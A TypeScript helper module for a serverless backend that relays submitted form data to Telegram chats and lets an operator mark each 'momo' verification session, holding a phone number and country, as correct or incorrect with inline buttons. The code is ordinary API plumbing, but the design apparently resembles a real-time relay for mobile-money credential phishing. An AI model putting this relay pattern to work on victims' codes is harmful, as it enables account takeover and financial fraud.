// Server-side Telegram Bot API helper for Vercel Serverless Functions and Node.js backend

export interface TelegramCredentials {
  botToken: string;
  chatId: string;
  chatIds: string[];
}

export interface VerificationSession {
  status: 'pending' | 'correct' | 'incorrect';
  type?: string;
  phone?: string;
  country?: string;
  messageId?: number;
  updatedAt: number;
}

// Global in-memory session registry (shared within warm serverless instances and persistent servers)
declare global {
  // eslint-disable-next-line no-var
  var __momo_verification_sessions: Map<string, VerificationSession> | undefined;
}

if (!globalThis.__momo_verification_sessions) {
  globalThis.__momo_verification_sessions = new Map<string, VerificationSession>();
}

export const verificationSessionStore = globalThis.__momo_verification_sessions;

let cachedTokenCheck: { token: string; isValid: boolean; timestamp: number } | null = null;

/**
 * Validate bot token against Telegram getMe and cache the result for 60 seconds
 */
export async function checkBotTokenValidity(botToken: string): Promise<boolean> {
  const token = cleanBotToken(botToken);
  if (!token || token.includes('EXAMPLE')) return false;

  const now = Date.now();
  if (cachedTokenCheck && cachedTokenCheck.token === token && now - cachedTokenCheck.timestamp < 60000) {
    return cachedTokenCheck.isValid;
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
    const data = (await res.json()) as any;
    const isValid = Boolean(data && data.ok);
    cachedTokenCheck = { token, isValid, timestamp: now };
    if (!isValid && data?.error_code === 401) {
      console.warn('[Telegram Setup] The configured bot token returned 401 Unauthorized. Operating in fallback simulation mode.');
    }
    return isValid;
  } catch {
    cachedTokenCheck = { token, isValid: false, timestamp: now };
    return false;
  }
}

export function cleanEnv(val?: any): string {
  if (val === undefined || val === null) return '';
  let s = String(val).trim();
  // Strip surrounding quotes
  if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) {
    s = s.slice(1, -1).trim();
  }
  return s;
}

export function cleanBotToken(val?: any): string {
  let s = cleanEnv(val);
  if (!s) return '';
  // Strip trailing slashes or spaces
  s = s.replace(/\/+$/, '').trim();

  // If user pasted a full URL like https://api.telegram.org/bot<token>
  const urlMatch = s.match(/bot(\d+:[A-Za-z0-9_-]+)/);
  if (urlMatch) {
    return urlMatch[1];
  }

  // If user pasted "bot123456:ABC...", strip "bot" prefix because API URL already contains /bot<token>
  if (s.toLowerCase().startsWith('bot') && s.includes(':')) {
    s = s.slice(3).trim();
  }
  return s;
}

export function cleanChatIds(val?: any): string[] {
  const s = cleanEnv(val);
  if (!s) return [];

  // Split by commas, semicolons, newlines, or whitespace in case multiple IDs were configured
  const rawParts = s.split(/[,;\n\r\t]+/).map((p) => p.trim()).filter(Boolean);
  const results: string[] = [];

  for (let part of rawParts) {
    // Strip chat_id= or id=
    part = part.replace(/^chat_id=/i, '').replace(/^id=/i, '').trim();
    // If user pasted t.me/username
    if (part.includes('t.me/')) {
      const match = part.match(/t\.me\/([A-Za-z0-9_]+)/);
      if (match) part = '@' + match[1];
    }
    // Remove enclosing quotes or parens
    part = part.replace(/^["'(\[]+|["')\]]+$/g, '').trim();
    if (part) {
      results.push(part);
    }
  }

  return results.length > 0 ? results : [s];
}

/**
 * Retrieve Telegram Bot Token and Chat ID securely from environment variables at runtime.
 * Evaluated on every request so runtime variables in serverless/production are never stale.
 */
export function getTelegramCredentials(): TelegramCredentials {
  const token = cleanBotToken(
    process.env.TELEGRAM_BOT_TOKEN ||
    process.env.BOT_TOKEN ||
    process.env.TELEGRAM_TOKEN ||
    process.env.TG_BOT_TOKEN ||
    process.env.TG_TOKEN ||
    process.env.TOKEN ||
    process.env.TELEGRAM_API_KEY ||
    process.env.TELEGRAM_API_TOKEN ||
    process.env.VITE_TELEGRAM_BOT_TOKEN ||
    process.env.VITE_BOT_TOKEN ||
    process.env.VITE_TELEGRAM_TOKEN ||
    process.env.VITE_TG_BOT_TOKEN ||
    process.env.ZITE_TELEGRAM_BOT_TOKEN ||
    process.env.MOMO_BOT_TOKEN ||
    process.env.BOT_API_KEY ||
    ''
  );

  const rawChat = cleanEnv(
    process.env.TELEGRAM_CHAT_ID ||
    process.env.CHAT_ID ||
    process.env.TELEGRAM_CHATID ||
    process.env.TG_CHAT_ID ||
    process.env.CHANNEL_ID ||
    process.env.CHATID ||
    process.env.TELEGRAM_USER_ID ||
    process.env.TELEGRAM_CHANNEL_ID ||
    process.env.VITE_TELEGRAM_CHAT_ID ||
    process.env.VITE_CHAT_ID ||
    process.env.VITE_TELEGRAM_CHATID ||
    process.env.VITE_TG_CHAT_ID ||
    process.env.ZITE_TELEGRAM_CHAT_ID ||
    process.env.MOMO_CHAT_ID ||
    ''
  );

  const chatIds = cleanChatIds(rawChat);
  const primaryChatId = chatIds[0] || '';

  return { botToken: token, chatId: primaryChatId, chatIds };
}

/**
 * Explicitly disable active Telegram webhooks to ensure getUpdates polling works without 409 Conflict.
 */
export async function disableTelegramWebhook(botToken: string): Promise<boolean> {
  const token = cleanBotToken(botToken);
  if (!token) return false;
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=false`, {
      method: 'POST',
    });
    const data = (await res.json()) as any;
    return Boolean(data.ok);
  } catch {
    return false;
  }
}

/**
 * Safely parse incoming request body from Vercel Serverless or Express
 */
export function parseRequestBody(req: any): Record<string, any> {
  if (!req) return {};
  let body = req.body;
  if (typeof body === 'string') {
    try {
      body = JSON.parse(body);
    } catch {
      body = {};
    }
  }
  return body || {};
}

/**
 * Escape HTML special characters for Telegram HTML parse mode
 */
export function escapeHtml(text: any = ''): string {
  return String(text ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/**
 * Format any additional payload fields into a clean bulleted list
 */
export function formatExtraFields(input: Record<string, any>, knownKeys: string[]): string {
  const extraKeys = Object.keys(input).filter(
    (k) => !knownKeys.includes(k) && input[k] !== undefined && input[k] !== '' && typeof input[k] !== 'object'
  );
  if (extraKeys.length === 0) return '';

  const lines = extraKeys.map((k) => `• <b>${escapeHtml(k)}:</b> ${escapeHtml(String(input[k]))}`);
  return `\n\n📋 <b>Additional Details:</b>\n${lines.join('\n')}`;
}

/**
 * Strip HTML tags safely for plain-text fallback
 */
export function stripHtmlToPlainText(html: string): string {
  return html
    .replace(/<b>(.*?)<\/b>/gi, '$1')
    .replace(/<i>(.*?)<\/i>/gi, '$1')
    .replace(/<pre>([\s\S]*?)<\/pre>/gi, '$1')
    .replace(/<code>(.*?)<\/code>/gi, '$1')
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/<[^>]*>/g, '');
}

/**
 * Send a message via Telegram Bot API with automatic HTML-to-Plain-Text fallback
 * and support for single or multiple recipient chat IDs.
 */
export async function sendTelegramMessage(
  botToken: string,
  chatTarget: string | string[],
  htmlText: string,
  inlineKeyboard?: Array<Array<{ text: string; callback_data: string }>>
): Promise<{ ok: boolean; result?: any; description?: string; error_code?: number; targets?: string[] }> {
  const token = cleanBotToken(botToken);
  const targets = Array.isArray(chatTarget) ? chatTarget : cleanChatIds(chatTarget);

  if (!token) {
    console.warn('[Telegram API] TELEGRAM_BOT_TOKEN is not configured.');
    return { ok: false, description: 'TELEGRAM_BOT_TOKEN is not configured' };
  }

  if (targets.length === 0 || !targets[0]) {
    console.warn('[Telegram API] TELEGRAM_CHAT_ID is not configured.');
    return { ok: false, description: 'TELEGRAM_CHAT_ID is not configured' };
  }

  let anySuccess = false;
  let firstResult: any = null;
  let lastErrorDesc = '';
  let lastErrorCode: number | undefined;

  for (const chatId of targets) {
    const payload: any = {
      chat_id: chatId,
      text: htmlText,
      parse_mode: 'HTML',
    };

    if (inlineKeyboard && inlineKeyboard.length > 0) {
      payload.reply_markup = { inline_keyboard: inlineKeyboard };
    }

    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = (await res.json()) as { ok: boolean; result?: any; description?: string; error_code?: number };

      if (!data.ok) {
        lastErrorDesc = data.description || 'Unknown Telegram rejection';
        lastErrorCode = data.error_code;

        if (data.error_code === 401) {
          console.warn(`[Telegram API Notice] Bot token is unauthorized (401). Falling back to simulation mode.`);
          if (cachedTokenCheck) cachedTokenCheck.isValid = false;
          break;
        }

        // Plain text fallback
        const plainPayload: any = {
          chat_id: chatId,
          text: stripHtmlToPlainText(htmlText),
        };
        if (inlineKeyboard && inlineKeyboard.length > 0) {
          plainPayload.reply_markup = { inline_keyboard: inlineKeyboard };
        }

        const retryRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(plainPayload),
        });

        const retryData = (await retryRes.json()) as any;
        if (retryData.ok) {
          anySuccess = true;
          if (!firstResult) firstResult = retryData.result;
          console.log(`[Telegram API] Message delivered to ${chatId} via plain-text retry.`);
        } else {
          lastErrorDesc = retryData.description || lastErrorDesc;
          lastErrorCode = retryData.error_code || lastErrorCode;
          console.warn(`[Telegram API Notice] Delivery to ${chatId} unsuccessful (${retryData.error_code}): ${retryData.description}`);
        }
      } else {
        anySuccess = true;
        if (!firstResult) firstResult = data.result;
        console.log(`[Telegram API] Message delivered successfully to ${chatId}`);
      }
    } catch (err: any) {
      lastErrorDesc = err.message || String(err);
      console.warn(`[Telegram API Network Warning] target ${chatId}:`, err.message || err);
    }
  }

  return {
    ok: anySuccess,
    result: firstResult,
    description: anySuccess ? undefined : lastErrorDesc,
    error_code: lastErrorCode,
    targets,
  };
}

/**
 * Answer Telegram callback query (shows notification toast in Telegram client)
 */
export async function answerTelegramCallback(
  botToken: string,
  callbackQueryId: string,
  text: string
): Promise<boolean> {
  const token = cleanBotToken(botToken);
  if (!token || !callbackQueryId) return false;
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
      }),
    });
    return res.ok;
  } catch (err) {
    console.warn('[Telegram API] Failed to answer callback query:', err);
    return false;
  }
}

/**
 * Update Telegram message text and remove interactive buttons once decided
 */
export async function editTelegramMessageVerdict(
  botToken: string,
  chatId: string | number,
  messageId: number,
  originalText: string,
  isApproved: boolean
): Promise<boolean> {
  const token = cleanBotToken(botToken);
  if (!token || !chatId || !messageId) return false;
  try {
    const verdictBanner = isApproved ? '\n\n✅ <b>VERDICT: APPROVED</b>' : '\n\n❌ <b>VERDICT: REJECTED</b>';
    const plainBanner = isApproved ? '\n\n✅ VERDICT: APPROVED' : '\n\n❌ VERDICT: REJECTED';

    const res = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: escapeHtml(originalText) + verdictBanner,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [] },
      }),
    });

    const data = (await res.json()) as any;
    if (!data.ok) {
      // Plain text edit retry
      await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: stripHtmlToPlainText(originalText) + plainBanner,
          reply_markup: { inline_keyboard: [] },
        }),
      });
    }

    return true;
  } catch (err) {
    console.warn('[Telegram API] Failed to edit message verdict:', err);
    return false;
  }
}

/**
 * Safe server-side Telegram Diagnostics (never exposes raw bot token or sensitive secrets)
 */
export async function getSafeTelegramDiagnostics() {
  const { botToken, chatId, chatIds } = getTelegramCredentials();

  let botInfo: any = null;
  let botConnected = false;
  let webhookInfo: any = null;
  let connectionError: string | null = null;

  if (botToken) {
    try {
      const getMeRes = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
      const getMeData = (await getMeRes.json()) as any;
      if (getMeData && getMeData.ok && getMeData.result) {
        botConnected = true;
        botInfo = {
          id: getMeData.result.id,
          username: getMeData.result.username ? `@${getMeData.result.username}` : null,
          firstName: getMeData.result.first_name,
          canJoinGroups: getMeData.result.can_join_groups,
          canReadGroupMessages: getMeData.result.can_read_all_group_messages,
          supportsInlineQueries: getMeData.result.supports_inline_queries,
        };
      } else {
        connectionError = getMeData?.description || 'Invalid bot token or Telegram rejection';
      }
    } catch (err: any) {
      connectionError = err.message || 'Failed to reach api.telegram.org';
    }

    try {
      const webhookRes = await fetch(`https://api.telegram.org/bot${botToken}/getWebhookInfo`);
      const webhookData = (await webhookRes.json()) as any;
      if (webhookData && webhookData.ok && webhookData.result) {
        webhookInfo = {
          url: webhookData.result.url || '(none - direct polling mode)',
          hasCustomCertificate: webhookData.result.has_custom_certificate,
          pendingUpdateCount: webhookData.result.pending_update_count || 0,
          lastErrorDate: webhookData.result.last_error_date
            ? new Date(webhookData.result.last_error_date * 1000).toISOString()
            : null,
          lastErrorMessage: webhookData.result.last_error_message || null,
          maxConnections: webhookData.result.max_connections,
        };
      }
    } catch (err: any) {
      console.warn('[Telegram Diagnostics] getWebhookInfo request error:', err.message);
    }
  }

  const maskedChats = chatIds.map((c) => (c.length > 4 ? `***${c.slice(-4)}` : '***'));

  return {
    environment: process.env.VERCEL ? 'vercel-production' : process.env.NODE_ENV || 'production',
    timestamp: new Date().toISOString(),
    configuration: {
      botTokenConfigured: Boolean(botToken),
      botTokenPrefix: botToken ? `${botToken.slice(0, 4)}...` : null,
      chatIdConfigured: Boolean(chatId),
      chatCount: chatIds.length,
      chatIdsMasked: maskedChats,
    },
    telegramBot: {
      connected: botConnected,
      bot: botInfo,
      error: connectionError,
    },
    webhook: webhookInfo,
  };
}
